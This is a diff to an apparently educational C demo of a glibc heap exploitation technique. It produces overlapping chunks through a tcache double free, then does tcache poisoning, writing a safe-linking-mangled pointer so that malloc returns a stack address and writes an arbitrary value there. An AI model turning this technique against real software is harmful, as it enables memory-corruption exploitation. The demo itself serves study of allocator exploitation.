@@ -42,7 +42,7 @@ int main()
     printf("Allocating the victim chunk: a @ %p\n", a);
     puts("Allocating a padding to prevent consolidation.\n");
     malloc(0x10);
-    
+
     // cause chunk overlapping
     puts("Now we are able to cause chunk overlapping");
     puts("Step 1: fill up tcache list");
@@ -51,10 +51,10 @@ int main()
     }
     puts("Step 2: free the victim chunk so it will be added to unsorted bin");
     free(a);
-    
+
     puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
     free(prev);
-    
+
     puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
     malloc(0x100);
     /*VULNERABILITY*/
@@ -62,14 +62,19 @@ int main()
     /*VULNERABILITY*/
 
     puts("Now we have the chunk overlapping primitive:");
-    int prev_size = prev[-1] & 0xff0;
-    int a_size = a[-1] & 0xff0;
-    printf("prev @ %p, size: %#x, end @ %p\n", prev, prev_size, (void *)prev+prev_size);
-    printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
-    a = malloc(0x100);
-    memset(a, 0, 0x100);
-    prev[0x110/sizeof(intptr_t)] = 0x41414141;
-    assert(a[0] == 0x41414141);
+    puts("Malloc from the unsorted bin to control a->next pointer");
+    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
+    // mangle the pointer since glibc 2.32
+    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^(long)stack_var;
 
+    a = malloc(0x100);
+    int a_size = a[-1] & 0xff0;
+
+    intptr_t *victim = malloc(0x100);
+    victim[0] = 0xcafebabe;
+
+    printf("a      @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
+    printf("victim @ %p == stack_var @ %p\n", victim, stack_var);
+    assert(stack_var[0] == 0xcafebabe);
     return 0;
 }
